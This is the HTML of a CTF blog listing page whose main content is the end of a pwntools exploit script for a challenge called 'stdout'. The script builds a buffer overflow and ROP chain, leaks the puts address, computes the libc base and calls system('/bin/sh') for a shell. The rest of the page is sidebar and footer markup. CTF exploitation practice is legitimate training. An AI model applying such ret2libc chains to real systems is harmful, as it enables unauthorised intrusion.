puts=elf.plt[&#39;puts&#39;]
payload=b&#39;a&#39;*0x58+p64(vul)


p.send(payload)
payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(extend)+p64(vul)
p.send(payload)
for i in range(21):
    payload=b&#39;c&#39;*0x28+p64(extend)+p64(vul)
    p.send(payload)

p.recvuntil(&#39;stdout???&#39;)
p.recvline()
puts_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
base=puts_addr-0x10dfc0 #libc.sym[&#39;puts&#39;]
system=base+libc.sym[&#39;system&#39;]
binsh=base+next(libc.search(b&#39;bin/sh&#39;))
gdb.attach(p)
pause()
payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(system)
p.send(payload)
print(hex(libc.sym[&#39;puts&#39;]))
print(&#39;put&#39;+hex(puts_addr))


p.interactive()
</code></pre>

        


        <span>
          <a class="article-read" href="/2024/09/21/stdout/"> Read more -->
          </span>
        </div>

        
      </div>
      


      <div id="recent-posts-paginator">
        <a class="extend prev" rel="prev" href="/"> </a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/"> </a>
      </div>

    </div>

<aside id="sidebar">
  
  <div class="widget-box">
  	  <div class="widget-box">
    <h3 class="widget-title-friends">friends</h3>
    <div class="widget">
      
        <a class="friends-list-link" style="display: block;" href="https://fireworks99.github.io/" title target='_blank'
        >fireworks99</a>
      
    </div>
  </div>

  </div>
  
  <div class="widget-box">
  	

  </div>
  
  <div class="widget-box">
  	
  <div class="widget-box">
    <h3 class="widget-title-tag">tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-NewSar/" rel="tag">ctf-NewSar</a></li></ul>
    </div>
  </div>


  </div>
  
  <div class="widget-box">
  	
  <div class="widget-box">
    <h3 class="widget-title-archive">archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
    </div>
  </div>

  </div>
  
  <div class="widget-box">
  	
  <div class="widget-box">
    <h3 class="widget-title-post">recent_posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/11/26/FUZZ/xpdf/">xpdf</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/11/20/trick/">trick</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/11/20/trick/trick/">trick</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/11/18/qwnt2024/">qwnt2024</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/11/13/%E6%B2%99%E7%AE%B1/%E6%B2%99%E7%AE%B1/">æ²™ç®±</a>
          </li>
        
      </ul>
    </div>
  </div>

  </div>
  
</aside>

<!-- <div id="paginator"> -->
<!--   <a class="extend prev" rel="prev" href="/"> </a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/"> </a> -->
<!-- </div> -->

    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
          tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"] ],
            processEscapes: true
          }
        });
      </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
            tex2jax: {
              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
            }
          });
      </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
              var all = MathJax.Hub.getAllJax(), i;
              for(i=0; i < all.length; i += 1) {
                  all[i].SourceElement().parentNode.className += ' has-jax';
              }
          });
    </script>

    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>



			</div>
		</div>

		<div id="bottom-outer">
			<div id="bottom-inner">
				Site by your name | 
				Powered by <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a> |
				theme <a target="_blank" rel="noopener" href="https://github.com/fireworks99/hexo-theme-PreciousJoy">PreciousJoy</a>
			</div>
		</div>

		
	</div>





	
	<!-- scripts list from theme config.yml -->
	
	<script src="/js/jquery-3.5.1.min.js"></script>
	
	<script src="/js/PreciousJoy.js"></script>
	
	<script src="/js/highlight.pack.js"></script>
	
	<script src="/js/jquery.fancybox.min.js"></script>
	
	<script src="/js/search.js"></script>
	
	<script src="/js/load.js"></script>
	
	<script src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
	
	<script src="/js/clipboard.min.js"></script>
	
	

	<script>hljs.initHighlightingOnLoad();</script>

</body>
</html>
